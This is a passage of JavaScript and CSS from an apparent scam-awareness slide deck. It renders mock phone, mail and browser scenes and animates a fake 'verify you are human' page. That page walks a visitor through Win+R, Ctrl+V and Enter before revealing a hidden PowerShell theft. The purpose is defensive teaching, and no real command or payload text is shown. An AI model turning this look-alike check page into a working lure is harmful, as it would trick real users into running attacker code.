  '.wa-m .tm u{text-decoration:none;color:#53bdeb;letter-spacing:-.25em;margin-right:.25em}',
  '.wa-in{flex:none;display:flex;gap:10px;align-items:center;padding:10px 12px 34px;background:#efeae2}',
  '.wa-in div{flex:1;height:50px;border-radius:25px;background:#fff;padding:0 22px;font:400 20px/50px var(--f-body);color:#8696a0}',
  '.wa-in i{width:50px;height:50px;border-radius:50%;background:#00a884;display:grid;place-items:center}.wa-in i svg{width:26px;height:26px}',
  /* iPhone notification banner */
  '.nb{left:14px;right:14px;top:150px;z-index:6;display:flex;gap:14px;padding:16px 18px;border-radius:28px;background:rgba(246,246,248,.96);box-shadow:0 14px 40px rgba(0,0,0,.35);color:#000;font-family:var(--f-body)}',
  '.nb .ic{width:48px;height:48px;flex:none;border-radius:12px;background:linear-gradient(#65f57d,#0bc935);display:grid;place-items:center}.nb .ic svg{width:30px;height:30px}',
  '.nb>div:last-child{flex:1;min-width:0}',
  '.nb .hd{display:flex;justify-content:space-between;font:600 17px/1.2 var(--f-body);color:#3c3c43}.nb .hd span{font-weight:400;color:#8e8e93}',
  '.nb p{margin:4px 0 0;font:400 20px/1.32 var(--f-body)}',
  /* desktop mail app */
  '.pj-mw{position:absolute;left:60px;top:120px;width:1000px;height:870px;border-radius:16px;overflow:hidden;display:flex;flex-direction:column;background:#fff;color:#1f1f1f;',
  '  box-shadow:0 0 0 1px rgba(255,255,255,.14),0 50px 100px rgba(0,0,0,.7)}',
  '.mw-tb{flex:none;height:48px;display:flex;align-items:center;gap:9px;padding:0 18px;background:#ececee;border-bottom:1px solid #d6d6d8;position:relative}',
  '.mw-tb i{width:14px;height:14px;border-radius:50%;background:#ff5f57}.mw-tb i+i{background:#febc2e}.mw-tb i+i+i{background:#28c840}',
  '.mw-tb span{position:absolute;left:0;right:0;text-align:center;font:600 16px/48px var(--f-body);color:#555;pointer-events:none}',
  '.mw-in{flex:1;display:flex;min-height:0}',
  '.mw-sd{width:190px;flex:none;padding:18px 10px;background:#f3f3f6;border-right:1px solid #e2e2e6;font:500 18px/1 var(--f-body);color:#444}',
  '.mw-sd div{display:flex;justify-content:space-between;padding:12px 14px;border-radius:8px}',
  '.mw-sd .on{background:#dfe6f6;color:#1a3d8f;font-weight:700}',
  '.mw-rd{flex:1;min-width:0;padding:26px 34px 20px}',
  '.mw-sj{display:inline;font:600 27px/1.3 var(--f-body);color:#1f1f1f}',
  '.mw-fr{display:flex;gap:14px;align-items:center;margin:20px 0 22px}',
  '.mw-fr .av{width:50px;height:50px;flex:none;border-radius:50%;display:grid;place-items:center;font:700 23px/1 var(--f-body);color:#fff}',
  '.mw-fr .who{flex:1;min-width:0;font:400 17px/1.4 var(--f-body);color:#5f6368}',
  '.mw-fr .who b{font-size:19px;color:#1f1f1f}.mw-fr .who small{display:block;font-size:15px}',
  '.mw-fr time{font:400 15px/1 var(--f-body);color:#5f6368}',
  '.mw-card{max-width:680px;border:1px solid #e3e3e6;border-radius:12px}',
  '.mw-bh{padding:18px 28px;border-radius:11px 11px 0 0;font:900 30px/1 var(--f-body);letter-spacing:.05em}',
  '.mw-bd{padding:22px 30px 10px;font:400 19px/1.5 var(--f-body);color:#333}',
  '.mw-bd p{margin:0 0 14px}.mw-bd .sig{color:#666}',
  '.mw-cta{position:relative;margin:6px 0 58px}',
  '.mw-btn{display:inline-block;padding:14px 30px;border-radius:8px;background:#335fff;color:#fff;font:700 19px/1 var(--f-body)}',
  '.mw-btn.red{background:#e50914}',
  '.mw-cta .cur{position:absolute;left:200px;top:22px;width:30px;height:30px;z-index:3}',
  '.mw-tip{position:absolute;left:150px;top:56px;z-index:2;white-space:nowrap;padding:6px 12px;border-radius:6px;background:#fffbe6;border:1px solid #d8cfa0;box-shadow:0 4px 12px rgba(0,0,0,.18);font:400 16px/1.2 var(--f-mono);color:#333}'
]);

/* the fake check page (kind 'web'). Overlays are written as '.pj .pc-x' so their transitions beat '.pj [data-f]'. */
addCss('pj-web-css', [
  '.pj .pj-pc{position:absolute;left:50px;top:110px;width:1020px;height:880px;border-radius:14px;overflow:hidden;background:#fff;color:#1f1f1f;',
  '  box-shadow:0 0 0 1px rgba(255,255,255,.14),0 50px 100px rgba(0,0,0,.7)}',
  '.pc-br{position:absolute;left:0;top:0;right:0;bottom:48px;display:flex;flex-direction:column}',
  /* browser chrome */
  '.pc-tabs{flex:none;position:relative;height:42px;display:flex;align-items:flex-end;gap:6px;padding-left:10px;background:#dfe3e8}',
  '.pc-tab{width:250px;height:34px;display:flex;align-items:center;gap:9px;padding:0 12px;border-radius:10px 10px 0 0;background:#fff;font:400 14px/1 var(--f-body);color:#222}',
  '.pc-tab .fav{width:20px;flex:none}.pc-tab .fav svg{width:20px;display:block}.pc-tab span{flex:1}.pc-tab b{font:400 12px/1 var(--f-body);color:#555}',
  '.pc-plus{align-self:center;margin-left:6px;font:300 24px/1 var(--f-body);color:#444}',
  '.pc-wc{position:absolute;right:0;top:0;height:42px;display:flex}.pc-wc i{width:54px;display:grid;place-items:center;font:400 14px/1 var(--f-body);font-style:normal;color:#333}',
  '.pc-tool{flex:none;height:48px;display:flex;align-items:center;gap:16px;padding:0 14px;background:#fff;border-bottom:1px solid #e3e3e3;color:#5f6368}',
  '.pc-tool>svg{width:20px;height:20px;flex:none}',
  '.pc-url{flex:1;height:34px;display:flex;align-items:center;gap:12px;padding:0 16px;border-radius:17px;background:#eef1f4;font:400 16px/1 var(--f-body);color:#202124}',
  '.pc-url svg{width:18px;height:18px;color:#5f6368}.pc-dots{font:700 20px/1 var(--f-body);font-style:normal}',
  /* the look-alike check page */
  '.pc-pg{flex:1;position:relative;background:#fff}',
  '.pc-pg h1{position:absolute;left:50px;top:40px;margin:0;display:flex;align-items:center;gap:20px;font:600 46px/1 var(--f-body);letter-spacing:-.01em;color:#222}',
  '.pc-pg h1 i{width:58px;height:58px;border-radius:10px;background:#d9531e;display:grid;place-items:center}.pc-pg h1 svg{width:44px}',
  '.pc-sub,.pc-sec{position:absolute;left:50px;right:50px;margin:0;font:400 23px/1.35 var(--f-body);color:#3a3a3a}',
  '.pc-sub{top:122px}.pc-sec{top:290px}',
  '.pc-cf{position:absolute;left:50px;top:178px;width:330px;height:68px;border:1px solid #d6d6d6;border-radius:4px;background:#fafafa}',
  '.cf-bx{position:absolute;left:18px;top:20px;width:26px;height:26px;border:2px solid #666;border-radius:4px;background:#fff;transition:opacity .2s}',
  '.cf-sp{position:absolute;left:17px;top:19px;width:28px;height:28px;border:3px solid #cfe9d8;border-top-color:#1a8f4a;border-radius:50%;opacity:0;animation:pc-spin .8s linear infinite}',
  '@keyframes pc-spin{to{transform:rotate(360deg)}}',
  '.pj.w-load .cf-bx,.pj.a2 .cf-bx{opacity:0}.pj.w-load .cf-sp,.pj.a2 .cf-sp{opacity:1}',
  '.cf-t{position:absolute;left:58px;top:0;font:400 16px/68px var(--f-body);color:#222}.cf-t b{font-weight:400}.cf-t b+b,.pj.w-load .cf-t b{display:none}.pj.w-load .cf-t b+b{display:inline}',
  '.cf-lg{position:absolute;right:12px;top:9px;display:flex;flex-direction:column;align-items:center}.cf-lg svg{width:42px;display:block}',
  '.cf-lg b{font:800 10px/1 var(--f-body);letter-spacing:.08em;color:#404040}.cf-lg small{margin-top:3px;font:400 9px/1 var(--f-body);color:#555;text-decoration:underline}',
  /* the popup that asks for the key presses */
  '.pc-dim{position:absolute;inset:0;background:rgba(70,70,70,.58);opacity:0;transition:opacity .5s}.pj.a3 .pc-dim{opacity:1}',
  '.pj .pc-pop{position:absolute;right:28px;top:22px;width:492px;border-radius:10px;background:#fff;box-shadow:0 20px 50px rgba(0,0,0,.4);',
  '  opacity:0;transform:translateY(26px) scale(.97);transition:opacity .45s,transform .6s var(--ease)}',
  '.pj.a3 .pc-pop{opacity:1;transform:none}',
  '.pp-hd{display:flex;justify-content:space-between;align-items:center;padding:20px 26px;border-radius:10px 10px 0 0;background:linear-gradient(90deg,#f3801f,#f8a23d);color:#fff}',
  '.pp-hd b{display:block;font:700 25px/1.2 var(--f-body)}.pp-hd small{display:block;margin-top:4px;font:400 16px/1.2 var(--f-body)}',
  '.pp-lg{display:flex;flex-direction:column;align-items:center}.pp-lg svg{width:42px;display:block}.pp-lg b{font:800 9px/1 var(--f-body);letter-spacing:.08em;color:#6b3300}',
  '.pp-bd{padding:22px 28px}.pp-h{margin-bottom:16px;font:600 20px/1 var(--f-body);color:#222}',
  '.pj .pp-st{display:flex;flex-direction:column;gap:6px;padding:2px 0 2px 14px;border-left:3px solid #f3801f}',
  '.pp-row{display:flex;align-items:center;gap:14px;padding:8px 10px;border-radius:8px;transition:background .3s}',
  '.pp-n{width:28px;height:28px;flex:none;border-radius:50%;background:#f6a821;color:#fff;font:700 15px/28px var(--f-body);font-style:normal;text-align:center;transition:background .3s}',
  '.pp-row span{flex:1;font:400 18px/1.25 var(--f-body);color:#222}',
  '.pp-row em{display:flex;align-items:center;gap:4px;font:400 13px/1 var(--f-body);font-style:normal;color:#999}',
  '.pp-row kbd{min-width:32px;height:30px;padding:0 7px;display:grid;place-items:center;border:1px solid #cfcfcf;border-radius:4px;background:#f6f6f6;font:500 14px/1 var(--f-body);color:#333}',
  '.pp-row kbd svg{width:16px;height:16px}',
  '.pj.r1 .pr1,.pj.r2 .pr2,.pj.r3 .pr3{background:#fff1d6}.pj.r1 .pr1 .pp-n,.pj.r2 .pr2 .pp-n,.pj.r3 .pr3 .pp-n{background:#2e9e5b}',
  '.pp-ag{margin:18px 0 10px;font:400 17px/1 var(--f-body);color:#555}',
  '.pp-code{padding:12px 18px;border-left:3px solid #f3801f;border-radius:4px;background:#f1f1f1;font:400 15px/1.45 var(--f-mono);color:#333}',
  '.pp-ft{display:flex;align-items:center;justify-content:space-between;gap:20px;padding:18px 28px;border-radius:0 0 10px 10px;background:#f6f6f6;border-top:1px solid #eee}',
  '.pp-ft>span{font:400 15px/1.3 var(--f-body);color:#666}',
  '.pp-btn{flex:none;padding:13px 24px;border-radius:5px;background:#dcdcdc;color:#8a8a8a;font:700 17px/1 var(--f-body);letter-spacing:.04em;transition:background .3s,color .3s}',
  '.pp-btn u{text-decoration:none}.pp-btn u+u,.pj.ver .pp-btn u{display:none}.pj.ver .pp-btn u+u{display:inline}.pj.ver .pp-btn{background:#2e9e5b;color:#fff}',
  /* Windows taskbar */
  '.pc-task{position:absolute;left:0;right:0;bottom:0;height:48px;display:flex;align-items:center;justify-content:center;background:#e9eef5;border-top:1px solid #d5dbe3}',
  '.tk-c{display:flex;gap:10px}.tk-c i{width:38px;height:38px;border-radius:6px;display:grid;place-items:center}.tk-c i svg{width:22px;height:22px}.tk-c i.on{background:#fff}',
  '.tk-r{position:absolute;right:18px;top:0;height:48px;display:flex;align-items:center;gap:16px;font:400 13px/1 var(--f-body);color:#222}.tk-r b{font-weight:400}',
  /* Run box */
  '.pj .pc-run{position:absolute;left:14px;top:604px;width:462px;z-index:5;border-radius:8px;background:#f3f3f3;box-shadow:0 0 0 1px rgba(0,0,0,.25),0 18px 44px rgba(0,0,0,.45);',
  '  opacity:0;transform:translateY(22px) scale(.98);transition:opacity .35s,transform .45s var(--ease),box-shadow .4s}',
  '.pj.run .pc-run{opacity:1;transform:none}',
  '.rn-tb{display:flex;align-items:center;gap:10px;height:36px;padding-left:14px;font:400 14px/1 var(--f-body);color:#222}.rn-tb i svg{width:16px;height:16px;display:block}',
  '.rn-tb b{margin-left:auto;width:46px;text-align:center;font-weight:400;color:#333}',
  '.rn-bd{display:flex;gap:16px;padding:10px 22px 6px}.rn-ic svg{width:40px;height:40px}.rn-bd p{margin:0;font:400 15px/1.4 var(--f-body);color:#222}',
  '.rn-op{display:flex;align-items:center;gap:14px;padding:10px 22px}.rn-op>span{font:400 15px/1 var(--f-body);color:#222}',
  '.rn-in{flex:1;height:34px;border:1px solid #8a8a8a;border-bottom:2px solid #005fb8;border-radius:4px;background:#fff}',
  '.rn-sc{position:absolute;top:0;bottom:0;left:8px;right:8px;display:flex;align-items:center;overflow:hidden;white-space:nowrap;font:400 15px/1 var(--f-body);color:#111}',
  '.rn-tx{display:none;flex:none}.pj.paste .rn-tx{display:inline}.pj.paste .rn-sc{justify-content:flex-end}',
  '.rn-ca{flex:none;width:1.5px;height:20px;background:#111;animation:pc-blink 1s steps(1) infinite}@keyframes pc-blink{50%{opacity:0}}',
  '.rn-bt{display:flex;justify-content:flex-end;gap:8px;margin-top:6px;padding:12px 18px 16px;border-radius:0 0 8px 8px;background:#ebebeb}',
  '.rn-bt b{width:96px;height:32px;border:1px solid #c9c9c9;border-radius:4px;background:#fdfdfd;font:400 14px/30px var(--f-body);text-align:center;color:#222}',
  '.rn-bt b.pri{background:#005fb8;border-color:#005fb8;color:#fff}',
  /* PowerShell (really hidden; shown here so we can see what it does) */
  '.pj .pc-ps{position:absolute;left:16px;top:112px;width:462px;z-index:6;border-radius:8px;background:#012456;box-shadow:0 0 0 1px rgba(255,255,255,.2),0 20px 50px rgba(0,0,0,.55);',
  '  opacity:0;transform:scale(.96);transition:opacity .3s,transform .4s var(--ease),box-shadow .4s}',
  '.pj.ent .pc-ps{opacity:1;transform:none}',
  '.ps-tb{display:flex;align-items:center;gap:10px;height:34px;padding:0 14px;border-radius:8px 8px 0 0;background:#1f1f1f;font:400 14px/1 var(--f-body);color:#ddd}',
  '.ps-tb i{font:700 13px/1 var(--f-mono);font-style:normal;color:#5ab0ff}.ps-tb span{margin-left:auto;color:#aaa;letter-spacing:.2em}',
  '.ps-bd{min-height:230px;padding:14px 16px 18px}',
  '.ps-l{font:400 14px/1.75 var(--f-mono);color:#eee;white-space:pre;opacity:0;transition:opacity .2s}.ps-l.on{opacity:1}',
  '.ps-l b{font-weight:400;color:#ffd75e}.ps-l em{font-style:normal;font-weight:700;color:#ff6b6b}',
  /* clipboard reveal */
  '.pj .pc-clip{position:absolute;left:16px;top:398px;width:462px;z-index:4;padding:16px 18px 14px;border-radius:12px;background:#15171c;color:#eee;',
  '  box-shadow:0 0 0 1px rgba(255,255,255,.18),0 18px 44px rgba(0,0,0,.5);opacity:0;transform:translateY(18px);transition:opacity .4s,transform .5s var(--ease),box-shadow .4s}',
  '.pj.clip .pc-clip{opacity:1;transform:none}',
  '.cl-h{margin-bottom:12px;font:700 15px/1 var(--f-body);letter-spacing:.1em;text-transform:uppercase;color:#ffc46b}',
  '.pc-clip code{display:block;font:400 17px/1.45 var(--f-mono);word-break:break-all}.pc-clip .bad{font-weight:700;color:#ff6b6b}.pc-clip .ok{color:#8b919c}',
  '.cl-n{margin-top:10px;font:400 16px/1.3 var(--f-body);color:#bbb}.cl-n b{color:#ff8a8a}',
  /* keys being pressed */
  '.pc-kv{position:absolute;left:500px;top:712px;width:492px;height:84px;z-index:7;display:flex;justify-content:center;align-items:center;gap:14px;pointer-events:none;',
  '  opacity:0;transform:translateY(12px) scale(.9);transition:opacity .25s,transform .35s cubic-bezier(.3,1.5,.5,1)}',
  '.pc-kv.on{opacity:1;transform:none}',
  '.pc-kv kbd{min-width:76px;height:64px;padding:0 18px;display:grid;place-items:center;border-radius:12px;background:linear-gradient(#fff,#e4e6ec);color:#222;font:700 26px/1 var(--f-body);',
  '  box-shadow:0 6px 0 #8d909a,0 12px 24px rgba(0,0,0,.5);transition:transform .12s,box-shadow .12s}',
  '.pc-kv kbd svg{width:30px;height:30px}.pc-kv.dn kbd{transform:translateY(5px);box-shadow:0 1px 0 #8d909a,0 6px 14px rgba(0,0,0,.5)}',
  '.pc-kv i{font:700 30px/1 var(--f-body);font-style:normal;color:#fff;text-shadow:0 2px 6px rgba(0,0,0,.6)}',
  /* mouse pointer: tip lands on the checkbox */
  '.pc-cur{position:absolute;left:0;top:0;width:30px;height:30px;z-index:9;transform:translate(600px,640px);transition:transform 1s cubic-bezier(.45,0,.2,1),opacity .3s}',
  '.pc-cur svg{width:30px;height:30px;display:block;transition:transform .12s}',
  '.pj.a1 .pc-cur{transform:translate(76px,298px)}.pj.a2 .pc-cur svg{transform:scale(.85)}.pj.a3 .pc-cur svg{transform:none}.pj.nocur .pc-cur{opacity:0}'
]);

/* ---------------------------------------------------------------- slides */
var prev = 'wa-privacy';
SCAMS.forEach(function (s, idx) {
  var N = s.flags.length, P = s.pre || 0;   /* P: clicks that play out the scene before the first warning sign */
  Deck.insertSlide({
    after: prev, id: s.id, title: s.title, section: 'protect', tr: { type: 'fade', ms: 800 }, loop: false, calm: true,
    steps: P + N,
    render: function (el, ctx) {
      var r = h('div', 'pj ' + s.kind, el), dev;
      if (s.kind === 'phone') { dev = h('div', 'pj-ph', r); var scr = h('div', 'scr ' + s.scr, dev, s.html); h('div', 'isl', scr); }
      else dev = h('div', s.kind === 'web' ? 'pj-pc' : 'pj-mw', r, s.html);
      var col = h('div', 'pj-col', r,
        '<div class="pj-k">Spot the scam &middot; ' + (idx + 1) + '/' + SCAMS.length + '<span>' + s.chip + '</span></div>' +
        '<div class="pj-t">' + s.ttl + '</div>' +
        '<div class="pj-q"><div class="a">' + s.q + '</div><div class="b"><em>Do this:</em>' + s.ins + '</div></div>');
      var fl = h('div', 'pj-fl', col), st = el.__pj = { r: r, items: [], hits: [] };
      s.flags.forEach(function (f, i) {
        st.items.push(h('div', 'pj-f', fl, '<div class="n">' + (i + 1) + '</div><div><b>' + f[0] + '</b><span>' + f[1] + '</span></div>'));
        var tg = dev.querySelectorAll('[data-f="' + (i + 1) + '"]');
        st.hits.push(tg);
        if (!tg.length) return;
        var at = dev.querySelector('[data-f="' + (i + 1) + '"][data-pin]') || tg[0];
        h('i', 'pj-pin ' + (at.getAttribute('data-pin') || ''), at, String(i + 1));
      });
      h('div', 'pj-st', r, 'SCAM');
      var k0 = ctx.static ? P + N : 0;
      show(st, k0 - P);
      if (s.init) s.init(st, dev, ctx, k0);
    },
    /* s.scene(st, k, animate, ctx): extra per-slide states; animate only on a real forward click (not when the engine
       replays every step at once on arriving backwards: then ctx.step is still 0) */
    step: function (el, i, ctx) {
      var st = el.__pj; if (!st) return; show(st, i - P);
      if (s.scene) s.scene(st, i, !ctx.static && !ctx.reduced && ctx.step === i - 1, ctx);
    },
    unstep: function (el, i, ctx) { var st = el.__pj; if (!st) return; show(st, i - 1 - P); if (s.scene) s.scene(st, i - 1, false, ctx); }
  });
  prev = s.id;
});

/* show the first k warning signs (k = 0: just the message; k = all: stamped, with what to do instead) */
function show(st, k) {
  st.items.forEach(function (it, i) {
    it.classList.toggle('on', i < k);
    Array.prototype.forEach.call(st.hits[i], function (n) { n.classList.toggle('hit', i < k); });
  });
  st.r.classList.toggle('done', k >= st.items.length);
}

/* fake-check slide, state after k clicks. First what the visitor does (no warning signs yet):
     1 box clicked, popup asks for the keys   2 Win+R: Run box opens   3 Ctrl+V: pasted   4 Enter: Run box closes, page says Verified
   then what really happened (pre = 4, so click 4+n circles warning sign n):
     5 the popup's "jobs"   6 the clipboard is revealed   7 the Run box again   8 its hidden start   9 PowerShell steals, SCAM
   animate: play the click as it happens (pointer, key presses, typing). */
function webOn(k) {
  return { a1: k >= 1, a2: k >= 1, a3: k >= 1, nocur: k >= 2, r1: k >= 2, r2: k >= 3, r3: k >= 4, paste: k >= 3, ver: k >= 4,
    run: (k >= 2 && k < 4) || k >= 7, clip: k >= 6, ent: k >= 9 };
}
function webScene(st, k, animate, ctx) {
  var r = st.r, g = ++st.gen;
  function at(ms, fn) { ctx.timeout(function () { if (g === st.gen) fn(); }, ms); }
  function cls(c, on) { return function () { r.classList.toggle(c, on !== false); }; }
  function set(n) {
    var on = webOn(n);
    for (var c in on) r.classList.toggle(c, on[c]);
    Array.prototype.forEach.call(st.lines, function (l) { l.classList.toggle('on', n >= 9); });
    st.kv.className = 'pc-kv';
    if (n) r.classList.remove('w-load');
  }
  function keys(list) {
    st.kv.innerHTML = list.map(function (x) { return '<kbd>' + x + '</kbd>'; }).join('<i>+</i>');
    st.kv.classList.add('on');
    at(250, function () { st.kv.classList.add('dn'); }); at(520, function () { st.kv.classList.remove('dn'); });
    at(2000, function () { st.kv.classList.remove('on'); });
  }
  if (!animate) { set(k); return; }
  set(k - 1);
  if (k === 1) { cls('a1')(); at(1000, cls('a2')); at(1800, cls('a3')); }
  else if (k === 2) { cls('nocur')(); keys([WIN, 'R']); at(400, function () { cls('run')(); cls('r1')(); }); }
  else if (k === 3) { keys(['Ctrl', 'V']); at(400, function () { cls('paste')(); cls('r2')(); }); }
  else if (k === 4) { keys(['Enter &#x21B5;']); at(400, function () { cls('run', false)(); cls('r3')(); }); at(1100, cls('ver')); }
  else if (k === 9) {
    r.classList.remove('done');                       /* the stamp waits until the theft has played out */
    cls('ent')();
    Array.prototype.forEach.call(st.lines, function (l, i) { at(300 + i * 330, function () { l.classList.add('on'); }); });
    at(300 + st.lines.length * 330 + 150, cls('done'));
  }
  else set(k);
}
})();
